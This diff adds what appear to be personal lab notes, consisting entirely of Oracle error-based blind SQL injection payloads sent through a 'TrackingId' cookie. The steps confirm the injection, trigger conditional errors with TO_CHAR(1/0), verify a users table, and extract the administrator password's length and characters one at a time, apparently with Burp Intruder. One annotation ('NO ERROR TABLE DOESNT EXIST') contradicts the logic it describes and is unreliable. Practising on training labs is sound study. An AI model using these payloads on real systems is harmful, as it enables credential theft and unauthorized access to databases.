@@ -1,0 +1,19 @@
+TrackingId=xyz' >> ERROR
+TrackingId=xyz'' >> NO ERROR
+TrackingId=xyz'||(SELECT '')||'   OR   TrackingId=xyz'||(SELECT '' FROM dual)||'  (oracle)
+TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'  >> ERROR
+TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'  >> NO ERROR TABLE DOESNT EXIST
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' >> ERROR
+TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' >> NO ERROR
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+.... TAKE INTO INTRUDER
+
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+.... TAKE INTO INTRUDER
